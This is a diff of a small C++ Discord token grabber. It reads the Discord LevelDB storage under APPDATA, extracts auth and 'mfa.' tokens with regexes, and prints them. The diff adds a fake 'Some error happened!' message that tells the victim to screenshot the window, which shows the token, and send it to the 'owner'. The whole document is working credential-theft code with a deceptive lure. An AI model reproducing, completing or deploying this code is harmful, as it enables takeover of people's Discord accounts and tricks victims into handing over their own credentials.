@@ -7,18 +7,22 @@ using namespace std;
      | Made by xanthe1337
      | GitHub: https://github.com/xanthe1337
      | Discord: @xevy#1337
+     | Credits:
+     | Thanks ilinked1337 for the regexes <3 no homo
    */
-   size_t sz = 0;
+   FILE* fp;
    char* szBuf;
+   int errThrower;
+   size_t sz = 0;
    errno_t Environment = _dupenv_s(&szBuf, &sz, "APPDATA");
    string AppData = szBuf;
-   string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb"; 
+   string levelDB = AppData + "/Discord/Local Storage/leveldb/000005.ldb";
+   string Regex = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";
+   string otherRegex = R"(mfa\.[\w-]{84})";
    string String = "[oken";
    string Content;
 
-string readAllText(const char* filename) // Shortcut to read every single char in a file
-{
-  FILE* fp;
+string readAllText(const char* filename) { // Shortcut to read every single char in a file
   fopen_s(&fp, filename, "rb");
   if (fp) {
      fseek(fp, 0, SEEK_END);
@@ -26,21 +30,20 @@ string readAllText(const char* filename) // Shortcut to read every single char i
      rewind(fp);
      fread(&Content[0], 1, Content.size(), fp);
      fclose(fp);
-     return(Content);
   }
+  return(Content);
 }
 
-int main() // Main function, runs everything using outside functions and variables
-{
+int main() { // Main function, runs everything using outside functions and variables 
     smatch smatch;
     try {
         string data = readAllText(levelDB.c_str());
         if (data.find(String, 0) != string::npos) {
-           regex x(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");
+           regex x(Regex);
            if (regex_search(data, smatch, x) == true) {
                cout << smatch.str() << '\n';
            } else {
-               regex y(R"(mfa\.[\w-]{84})");
+               regex y(otherRegex);
                if (regex_search(data, smatch, y) == true) {
                   cout << smatch.str() << '\n';
                } else {
@@ -53,6 +56,7 @@ int main() // Main function, runs everything using outside functions and variabl
     } catch (exception) {
         return 0;
     }
+    errThrower = rand() % 550 + 950;
     system("pause >NUL");
-    cout << "Press any key to exit...";   
+    cout << "[" << errThrower << "] - Some error happened! screenshot this number and send it to the owner!";
 }
